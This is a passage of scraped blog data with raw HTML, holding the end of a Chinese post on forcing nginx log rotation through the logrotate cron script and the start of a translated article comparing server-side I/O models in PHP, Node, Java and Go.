id=\"crayon-594bd56e45bb6401810161-2\"><span class=\"crayon-p\">#!/bin/sh</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45bb6401810161-3\"><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45bb6401810161-4\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logrotate</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logrotate</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">conf</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45bb6401810161-5\"><span class=\"crayon-v\">EXITVALUE</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">?</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45bb6401810161-6\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">EXITVALUE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">then</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45bb6401810161-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logger</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">t</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">logrotate</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"ALERT exited abnormally with [$EXITVALUE]\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45bb6401810161-8\"><span class=\"crayon-e\">fi</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45bb6401810161-9\"><span class=\"crayon-i\">exit</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0018 seconds] -->\r\n<p>没有发现异常，配置好的日志轮转操作都是由这个脚本完成的，一切运行正常，脚本应该就没问题。</p>\n<p>直接执行命令：</p>\n<blockquote><p>[root@huanqiu_test ~]# /usr/sbin/logrotate /etc/logrotate.conf</p></blockquote>\n<p>这些系统日志是正常轮询了，但nginx日志却还是没轮询。</p>\n<p>接着强行启动记录文件维护操作，纵使logrotate指令认为没有需要，应该有可能是logroate认为nginx日志太小，不进行轮询。</p>\n<p>故需要强制轮询，即在/etc/cron.daily/logrotate脚本中将 -t 参数替换成 -f 参数</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd56e45bba491462520\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@huanqiu_test ~]# cat /etc/cron.daily/logrotate\r\n#!/bin/sh\r\n \r\n/usr/sbin/logrotate /etc/logrotate.conf &gt;/dev/null 2&gt;&amp;1\r\nEXITVALUE=$?\r\nif [ $EXITVALUE != 0 ]; then\r\n    /usr/bin/logger -f logrotate \"ALERT exited abnormally with [$EXITVALUE]\"\r\nfi\r\nexit 0</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bba491462520-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45bba491462520-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bba491462520-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45bba491462520-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bba491462520-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45bba491462520-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bba491462520-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45bba491462520-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bba491462520-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd56e45bba491462520-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">huanqiu_test</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># cat /etc/cron.daily/logrotate</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45bba491462520-2\"><span class=\"crayon-p\">#!/bin/sh</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45bba491462520-3\"><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45bba491462520-4\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logrotate</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logrotate</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">conf</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45bba491462520-5\"><span class=\"crayon-v\">EXITVALUE</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">?</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45bba491462520-6\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">EXITVALUE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">then</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45bba491462520-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logger</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">f</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">logrotate</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"ALERT exited abnormally with [$EXITVALUE]\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45bba491462520-8\"><span class=\"crayon-e\">fi</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45bba491462520-9\"><span class=\"crayon-i\">exit</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0019 seconds] -->\r\n<p>最后最后重启下cron服务：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd56e45bbe170906524\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@huanqiu_test ~]# /etc/init.d/crond restart\r\nStopping crond: [ OK ]\r\nStarting crond: [ OK ]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bbe170906524-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45bbe170906524-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bbe170906524-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd56e45bbe170906524-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">huanqiu_test</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># /etc/init.d/crond restart</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45bbe170906524-2\"><span class=\"crayon-e\">Stopping </span><span class=\"crayon-v\">crond</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">OK</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45bbe170906524-3\"><span class=\"crayon-e\">Starting </span><span class=\"crayon-v\">crond</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">OK</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111385\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111385votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111385\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/11/1d34dd467641215c527e32ede94fe494.jpg"], "fav_nums": 2, "comment_nums": 0, "create_date": "2017/06/07", "praise_nums": 1}
{"tags": " 1 评论 ,服务端,IT技术,性能", "front_image_path": "full/625c899e674c438418399f52ee70e33461080e9f.jpg", "title": "服务端I/O性能大比拼：Node、PHP、Java和Go", "url_object_id": "8b884d1f4992ae2504bfe347f2a532b5", "url": "http://blog.jobbole.com/111439/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.toptal.com/back-end/server-side-io-performance-node-php-java-go\">BRAD PEABODY</a>   译文出处：<a target=\"_blank\" href=\"http://www.itran.cc/2017/05/17/server-side-io-performance-node-php-java-go/\">dogstar</a>   </div><p>理解应用程序的输入/输出（I/O）模型，意味着其在计划处理负载与残酷的实际使用场景之间的差异。若应用程序比较小，也没有服务于很高的负载，也许它影响甚微。但随着应用程序的负载逐渐上涨，采用错误的I/O模型有可能会让你到处踩坑，伤痕累累。</p>\n<section>正如大部分存在多种解决途径的场景一样，重点不在于哪一种途径更好，而是在于理解如何进行权衡。让我们来参观下I/O的景观，看下可以从中窃取点什么。<img class=\"aligncenter\" src=\"http://7xslqv.com1.z0.glb.clouddn.com/images/8/81/62414141f3b3627e6f8dacbea29f0.jpg\" alt=\"\">\n<p>在这篇文章，我们将会结合Apache分别比较Node，Java，Go，和PHP，讨论这些不同的语言如何对他们的I/O进行建模，各个模型的优点和缺点，并得出一些初步基准的结论。如果关心你下一个Web应用的I/O性能，那你就找对文章了。</p>\n<h2 id=\"io\">I/O基础知识：快速回顾</h2>\n<p>为了理解与I/O密切相关的因素，必须先来回顾在操作系统底层的概念。虽然不会直接处理这些概念的大部分，但通过应用程序的运行时环境你一直在间接地处理他们。而关键在于细节。</p>\n<h3 id=\"\">系统调用</h3>\n<p>首先，我们有系统调用，它可以描述成这样：</p>\n<ul>\n<li>你的程序（在“用户区域”，正如他们所说的）必须让操作系统内核在它自身执行I/O操作。</li>\n<li>“系统调用”（syscall）意味着你的程序要求内核做某事。不同的操作系统，实现系统调用的细节有所不同，但基本的概念是一样的。这将会有一些特定的指令，把控制权从你的程序转交到内核（类似函数调用但有一些专门用于处理这种场景的特殊sauce）。通常来说，系统调用是阻塞的，意味着你的程序需要等待内核返回到你的代码。</li>\n<li>内核在我们所说的物理设备（硬盘、网卡等）上执行底层的I/O操作，并回复给系统调用。在现实世界中，内核可能需要做很多事情才能完成你的请求，包括等待设备准备就绪，更新它的内部状态等，但作为一名应用程序开发人员，你可以不用关心这些。以下是内核的工作情况。</li>\n</ul>\n<p><img class=\"aligncenter\" src=\"http://7xslqv.com1.z0.glb.clouddn.com/images/4/91/f79a78eb5c6c419aec0971955cc31.jpg\" alt=\"\"></p>\n<h3 id=\"\">阻塞调用与非阻塞调用</h3>\n<p>好了，我刚刚在上面说系统调用是阻塞的，通常来说这是对的。然而，有些调用被分类为“非阻塞”，意味着内核接收了你的请求后，把它放进了队列或者缓冲的某个地方，然后立即返回而并没有等待实际的I/O调用。所以它只是“阻塞”了一段非常短的时间，短到只是把你的请求入列而已。</p>\n<p>这里有一些有助于解释清楚的（Linux系统调用）例子：<code>-read()</code>是阻塞调用——你传给它一个文件句柄和一个存放所读到数据的缓冲，然后此调用会在当数据好后返回。注意这种方式有着优雅和简单的优点。<code>-epoll_create()</code>，<code>epoll_ctl()</code>，和<code>epoll_wait()</code>这些调用分别是，让你创建一组用于侦听的句柄，从该组添加/删除句柄，和然后直到有活动时才阻塞。这使得你可以通过一个线程有效地控制一系列I/O操作。如果需要这些功能，这非常棒，但也正如你所看到的，使用起来当然也相当复杂。</p>\n<p>理解这里分时差异的数量级是很重要的。如果一个CPU内核运行在3GHz，在没有优化的情况下，它每秒执行30亿次循环（或者每纳秒3次循环）。非阻塞系统调用可能需要10纳秒这样数量级的周期才能完成——或者“相对较少的纳秒”。对于正在通过网络接收信息的阻塞调用可能需要更多的时间——例如200毫秒（0.2秒）。例如，假设非阻塞调用消耗了20纳秒，那么阻塞调用消耗了200,000,000纳秒。对于阻塞调用，你的程序多等待了1000万倍的时间。 <img class=\"aligncenter\" src=\"http://7xslqv.com1.z0.glb.clouddn.com/images/0/37/2c535867b3c829329692d3b8a1a21.jpg\" alt=\"\"></p>\n<p>内核提供了阻塞I/O（“从网络连接中读取并把数据给我”）和非阻塞I/O（“当这些网络连接有新数据时就告诉我”）这两种方法。而使用何种机制，对应调用过程的阻塞时间明显长度不同。</p>\n<h3 id=\"\">调度</h3>\n<p>接下来第三件关键的事情是，当有大量线程或进程开始阻塞时怎么办。</p>\n<p>出于我们的目的，线程和进程之间没有太大的区别。实际上，最显而易见的执行相关的区别是，线程共享相同的内存，而每个进程则拥有他们独自的内存空间，使得分离的进程往往占据了大量的内存。但当我们讨论调度时，它最终可归结为一个事件清单（线程和进程类似），其中每个事件需要在有效的CPU内核上获得一片执行时间。如果你有300个线程正在运行并且运行在8核上，那么你得通过每个内核运行一段很短的时间然后切换到下一个线程的方式，把这些时间划分开来以便每个线程都能获得它的分时。这是通过“上下文切换”来实现的，使得CPU可以从正在运行的某个线程/进程切换到下一个。</p>\n<p>这些上下文切换有一定的成本——它们消耗了一些时间。在快的时候，可能少于100纳秒，但是根据实现的细节，处理器速度/架构，CPU缓存等，消耗1000纳秒甚至更长的时间也并不罕见。</p>\n<p>线程（或者进程）越多，上下文切换就越多。当我们谈论成千上万的线程，并且每一次切换需要数百纳秒时，速度将会变得非常慢。</p>\n<p>然而，非阻塞调用本质上是告诉内核“当你有一些新的数据或者这些连接中的任意一个有事件时才调用我”。这些非阻塞调用设计于高效地处理大量的I/O负载，以及减少上下文切换。</p>\n<p>到目前为止你还在看这篇文章吗？因为现在来到了有趣的部分：让我们来看下一些流利的语言如何使用这些工具，并就在易用性和性能之间的权衡作出一些结论……以及其他有趣的点评。</p>\n<p>请注意，虽然在这篇文章中展示的示例是琐碎的（并且是不完整的，只是显示了相关部分的代码），但数据库访问，外部缓存系统（memcache等全部）和需要I/O的任何东西，都以执行某些背后的I/O操作而结束，这些和展示的示例一样有着同样的影响。同样地，对于I/O被描述为“阻塞”（PHP，Java）这样的情节，HTTP请求与响应的读取与写入本身是阻塞的调用：再一次，更多隐藏在系统中的I/O及其伴随的性能问题需要考虑。</p>\n<p>为项目选择编程语言要考虑的因素有很多。当你只考虑性能时，要考虑的因素甚至有更多。但是，如果你关注的是程序主要受限于I/O，如果I/O性能对于你的项目至关重要，那这些都是你需要了解的。“保持简单”的方法：PHP。</p>\n<p>回到90年代的时候，很多人穿着匡威鞋，用Perl写着CGI脚本。随后出现了PHP，很多人喜欢使用它，它使得制作动态网页更为容易。</p>\n<p>PHP使用的模型相当简单。虽然有一些变化，但基本上PHP服务器看起来像：</p>\n<p>HTTP请求来自用户的浏览器，并且访问了你的Apache网站服务器。Apache为每个请求创建一个单独的进程，通过一些优化来重用它们，以便最大程度地减少其需要执行的次数（创建进程相对来说较慢）。Apache调用PHP并告诉它在磁盘上运行相应的<code>.php</code>文件。PHP代码执行并做一些阻塞的I/O调用。若在PHP中调用了<code>file_get_contents()</code>，那在背后它会触发<code>read()</code>系统调用并等待结果返回。</p>\n<p>当然，实际的代码只是简单地嵌在你的页面中，并且操作是阻塞的：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd525ccc5d994893153\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"含多种语言\"></span><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">PHP</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n&lt;?php // 阻塞的文件I/O\r\n$file_data = file_get_contents('/path/to/file.dat');\r\n\r\n// 阻塞的网络I/O\r\n$curl = curl_init('http://example.com/example-microservice');\r\n$result = curl_exec($curl);\r\n\r\n// 更多阻塞的网络I/O\r\n$result = $db-&gt;query('SELECT id, data FROM examples ORDER BY id DESC limit 100');\r\n\r\n?&gt;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc5d994893153-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc5d994893153-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc5d994893153-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc5d994893153-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc5d994893153-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc5d994893153-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc5d994893153-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc5d994893153-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc5d994893153-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc5d994893153-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc5d994893153-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd525ccc5d994893153-1\"><span class=\"crayon-ta\">&lt;?php</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 阻塞的文件I/O</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc5d994893153-2\"><span class=\"crayon-v\">$file_data</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">file_get_contents</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'/path/to/file.dat'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bd525ccc5d994893153-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc5d994893153-4\"><span class=\"crayon-c\">// 阻塞的网络I/O</span></div><div class=\"crayon-line\" id=\"crayon-594bd525ccc5d994893153-5\"><span class=\"crayon-v\">$curl</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">curl_init</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'http://example.com/example-microservice'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc5d994893153-6\"><span class=\"crayon-v\">$result</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">curl_exec</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">$curl</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bd525ccc5d994893153-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc5d994893153-8\"><span class=\"crayon-c\">// 更多阻塞的网络I/O</span></div><div class=\"crayon-line\" id=\"crayon-594bd525ccc5d994893153-9\"><span class=\"crayon-v\">$result</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">$db</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">query</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'SELECT id, data FROM examples ORDER BY id DESC limit 100'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc5d994893153-10\"> </div><div class=\"crayon-line\" id=\"crayon-594bd525ccc5d994893153-11\"><span class=\"crayon-ta\">?&gt;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- 